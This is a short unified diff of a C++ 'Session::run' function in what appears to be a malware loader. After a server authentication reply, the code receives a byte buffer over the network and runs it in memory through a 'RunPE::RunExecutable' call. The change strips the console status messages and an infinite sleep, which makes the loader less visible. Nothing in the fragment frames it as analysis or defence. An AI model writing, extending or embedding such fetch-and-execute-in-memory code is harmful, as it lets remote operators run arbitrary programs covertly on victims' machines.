@@ -22,14 +22,7 @@ void Session::run() {
 
 	const EServerResponse serverResponse = m_packetHandler->recvServerResponse();
 	if (serverResponse == EServerResponse::eSR_SUCCESS) {
-		Console::showConsoleMessage("success auth");
-
 		std::vector<char> fileBytes = m_packetHandler->recvBuffer();
 		RunPE::RunExecutable(fileBytes, { });
 	}
-	else {
-		Console::showConsoleMessage("failed auth");
-	}
-
-	Sleep(-1);
 }
